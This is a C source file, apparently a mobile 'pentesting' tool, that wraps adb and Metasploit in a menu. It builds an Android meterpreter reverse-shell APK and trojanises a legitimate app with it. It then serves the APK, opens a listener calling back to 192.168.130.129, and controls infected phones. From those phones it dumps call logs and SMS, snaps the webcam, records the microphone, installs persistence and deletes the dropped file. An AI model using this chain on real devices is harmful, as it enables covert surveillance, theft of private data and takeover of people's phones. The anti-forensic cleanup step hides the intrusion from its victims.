// Mobile Penetration Testing Automation Script
// Author: Muhammad Sudais Usmani
// Description: This script automates various tasks related to mobile pentesting.

#include <stdio.h>
#include <stdlib.h>

void run_command(const char *command) {
    printf("[+] Executing: %s\n", command);
    system(command);
}

void check_adb() {
    run_command("adb devices");
    run_command("adb connect 192.168.170.101:5555");
}

void adb_shell_access() {
    run_command("adb shell");
}

void generate_payload() {
    run_command("msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o backdoor.apk");
}

void inject_payload() {
    char original_apk[256];
    printf("Enter path to original APK: ");
    scanf("%255s", original_apk);
    char command[512];
    snprintf(command, sizeof(command), "msfvenom -x %s -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o infected_app.apk", original_apk);
    run_command(command);
}

void start_http_server() {
    run_command("python3 -m http.server 8080 &");
}

void start_msf_listener() {
    run_command("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.130.129; set LPORT 443; exploit'");
}

void control_device() {
    run_command("msfconsole -q -x 'sessions'");
    char session_id[10];
    printf("Enter session ID to interact with: ");
    scanf("%9s", session_id);
    char command[256];
    snprintf(command, sizeof(command), "msfconsole -q -x 'sessions -i %s'", session_id);
    run_command(command);
}

void extract_data() {
    run_command("msfconsole -q -x 'dump_calllog'");
    run_command("msfconsole -q -x 'dump_sms'");
    run_command("msfconsole -q -x 'webcam_snap'");
    run_command("msfconsole -q -x 'record_mic 10'");
}

void maintain_access() {
    run_command("msfconsole -q -x 'run persistence -A'");
}

void clear_traces() {
    run_command("adb shell rm /sdcard/backdoor.apk");
}

int main() {
    int choice;
    do {
        printf("\n[ Mobile Pentesting Automation ]\n");
        printf("1) Check ADB Connection\n");
        printf("2) Gain ADB Shell Access\n");
        printf("3) Generate Malicious APK\n");
        printf("4) Inject Payload into APK\n");
        printf("5) Start HTTP Server for Deployment\n");
        printf("6) Start Metasploit Listener\n");
        printf("7) Control Compromised Device\n");
        printf("8) Extract Data from Target\n");
        printf("9) Maintain Access\n");
        printf("10) Clear Traces\n");
        printf("11) Exit\n");
        printf("Choose an option: ");
        scanf("%d", &choice);

        switch (choice) {
            case 1: check_adb(); break;
            case 2: adb_shell_access(); break;
            case 3: generate_payload(); break;
            case 4: inject_payload(); break;
            case 5: start_http_server(); break;
            case 6: start_msf_listener(); break;
            case 7: control_device(); break;
            case 8: extract_data(); break;
            case 9: maintain_access(); break;
            case 10: clear_traces(); break;
            case 11: printf("Exiting...\n"); break;
            default: printf("Invalid option, please try again.\n");
        }
    } while (choice != 11);

    return 0;
}
